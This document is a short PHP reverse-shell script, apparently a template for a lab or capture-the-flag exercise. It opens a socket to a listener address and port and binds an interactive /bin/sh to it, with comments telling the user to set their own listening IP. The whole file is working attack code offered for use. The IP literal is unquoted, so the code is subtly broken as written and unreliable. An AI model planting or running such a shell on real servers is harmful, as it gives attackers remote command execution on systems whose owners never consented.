<?php
$ip = 10.10.223.152; // Change this to your listening IP
$port = 256; // Change this to your listening port

$sock = fsockopen($ip, $port);
$proc = proc_open('/bin/sh -i', array(0 => $sock, 1 => $sock, 2 => $sock), $pipes);
?>
